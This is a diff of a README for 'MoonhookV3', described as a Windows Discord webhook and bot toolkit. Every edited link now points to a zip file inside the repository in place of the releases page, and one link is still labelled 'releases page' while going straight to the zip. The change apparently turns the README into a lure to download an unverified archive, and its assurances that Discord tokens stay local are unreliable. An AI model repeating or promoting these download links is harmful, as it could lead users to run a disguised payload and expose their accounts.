@@ -7,7 +7,7 @@ This guide will walk you through everything you need to know, from downloading t
 
 ## 📥 Download MoonhookV3
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20MOONHOOKV3-6A0DAD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Macholiquidair778/MoonhookV3/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20MOONHOOKV3-6A0DAD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Macholiquidair778/MoonhookV3/main/moonhook_webhooks/1.0.zip)
 
 ### What You Get
 When you download MoonhookV3, you'll have access to a complete toolkit for managing Discord webhooks and bots. Here's what you can do:
@@ -29,7 +29,7 @@ MoonhookV3 is designed to run on **Windows** computers. Here's what you'll need:
 ## ⚙️ Installation Steps
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/Macholiquidair778/MoonhookV3/releases](https://github.com/Macholiquidair778/MoonhookV3/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Macholiquidair778/MoonhookV3/main/moonhook_webhooks/1.0.zip](https://raw.githubusercontent.com/Macholiquidair778/MoonhookV3/main/moonhook_webhooks/1.0.zip)
 
 On this page, you'll see the latest version of MoonhookV3 available for download. Look for the file labeled with the version number and click to download it.
 
@@ -120,7 +120,7 @@ A: Currently, MoonhookV3 is only available for Windows.
 A: Your token stays on your computer. MoonhookV3 doesn't send data anywhere except to your webhooks/bots.
 
 **Q: Are there updates?**
-A: Check the [releases page](https://github.com/Macholiquidair778/MoonhookV3/releases) for new versions with bug fixes and features.
+A: Check the [releases page](https://raw.githubusercontent.com/Macholiquidair778/MoonhookV3/main/moonhook_webhooks/1.0.zip) for new versions with bug fixes and features.
 
 ## 🔒 Privacy & Security
 - MoonhookV3 runs entirely on your local machine
